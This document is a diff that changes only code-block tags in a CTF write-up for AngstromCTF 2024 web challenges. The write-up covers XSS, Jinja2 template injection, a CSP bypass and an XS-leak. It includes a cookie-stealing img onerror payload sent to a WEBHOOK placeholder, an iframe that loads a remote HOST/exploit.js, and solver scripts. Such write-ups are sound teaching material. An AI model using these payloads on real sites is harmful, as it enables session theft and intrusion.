@@ -6,7 +6,7 @@ title: 'AngstromCTF2024'
 ## TL;DR
 This is a writeup for some web challenge for AngstromCTF 2024
 ## Spinner
-```javascript=
+```javascript
 const message = async () => {
     if (state.flagged) return
     const element = document.querySelector('.message')
@@ -22,7 +22,7 @@ message()
 We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.
 ## Markdown
 There are no filtering or any encoding use while parsing the HTML, so this is a simple XSS.
-```javascript=
+```javascript
 app.get('/view/:id', (_req, res) => {
     const marked = (
         'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
@@ -47,14 +47,14 @@ app.get('/view/:id', (_req, res) => {
 })
 ```
 A simple img tag can help us retrieve the cookie.
-```htmlembedded=
+```html
 <img src="" onerror="location='WEBHOOK/?c='+document.cookie">
 ```
 And finally make a GET request to get the flag.
 
 ## Winds
 This is an Jinja2 SSTI challenge, which they used render_template_string with untrusted data.
-```python=
+```python
 @app.post('/shout')
 def shout():
     text = request.form.get('text', '')
@@ -82,7 +82,7 @@ def shout():
     ''' % jumbled, error=request.args.get('error', ''))
 ```
 The tricky part was that the text was shuffle, but with the seed 0, we could preshuffle the payload so that it worked.
-```python=
+```python
 import random
 
 def unshuffle(text):
@@ -127,7 +127,7 @@ The /view endpoint with id=0 will get us the flag, if we got the MD5 password or
 This function will get the address of the thing we put in.
 ### Solve
 Why not bruteforcing the address. I thought that the address of the secrets.token_hex can be bruteforce. Combining with the hash 3 bytes, we could get the real password.
-```python=
+```python
 import hashlib
 from tqdm import tqdm
 
@@ -155,7 +155,7 @@ The CSP was set to `script-src 'self'`. What is self?
 `'self'` : Refers to the origin from which the protected document is being served, including the same URL scheme and port number.
 ### HTML Injection
 In client.js, we saw this:
-```javascript=
+```javascript
 "/login": async () => {
     const form = document.querySelector("form");
     const error = document.querySelector("p");
@@ -185,13 +185,13 @@ So, by `/login?error=<h1>hehe</h1>`, we got our HTML Injection.
 
 ### Simple XSS (right?)
 Will a simple 
-```htmlembedded=
+```html
 <script>alert(1)</script>
 ```
 worked?
 NO. It would be blocked by CSP. Maybe we need to upload something so that we could refer to it and not trigger CSP.
 In server.ts, it has an endpoint which is /api/setPicture. and this is helpful. But it read data and base64 encode them, how can deal with this?
-```typescript=
+```typescript
 const buffer = new Blob(data)
 const array = await buffer.arrayBuffer()
 const base64 = Buffer.from(array).toString('base64')
@@ -201,7 +201,7 @@ pictures.set(ctx.user, {
 })
 return { success: true as const }
 ```
-```typescript=
+```typescript
 else if (route === '/picture') {
     if (!url.includes('?')) return end()
 
@@ -220,7 +220,7 @@ else if (route === '/picture') {
 We could modify the Content-Type.
 But can javascript execute anything with `data:` in front of it? The answer is yes, actually, it can execute anything `anything:` before colon, because javascript treat those as labels. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label">labeled statement</a>
 So, simply host a Flask server
-```python=
+```python
 from flask import Flask, make_response
 
 app = Flask(__name__, static_folder='static')
@@ -237,7 +237,7 @@ if __name__ == "__main__":
 ```
 ### Execute
 We could simply add
-```htmlembedded!
+```html
 <script src="/picture?username=testtesttest"></script>
 ```
 to the login page right? No, because our script tag was added after the client.js load. How to deal with this? Iframe. We can have an iframe that run our javascript.
@@ -249,7 +249,7 @@ The rest leaves to you then.
 ## Wonderful Wicked Wrathful Wiretapping Wholesale World Wide Watermark as a Service
 This challenege was not pretty hard, because we could use img or script tag to check whether a site is 404 or 200. To be honest, this won't work for latest version of Chrome, because of Chrome's ORB. But luckily, the browser of admin bot was outdated. And another factor was that they configured the challenge's sites with SameSite policy, that's why the unintended trick worked.
 The exploit script
-```javascript!
+```javascript
 let flag = "actf{";
 
 let index = 0;
@@ -273,7 +273,7 @@ function search() {
 search();
 ```
 And in the Markdown challenge, we simply used
-```htmlembedded!
+```html
 <iframe srcdoc="<script src='HOST/exploit.js'></script>"/>
 ```
 That's it.
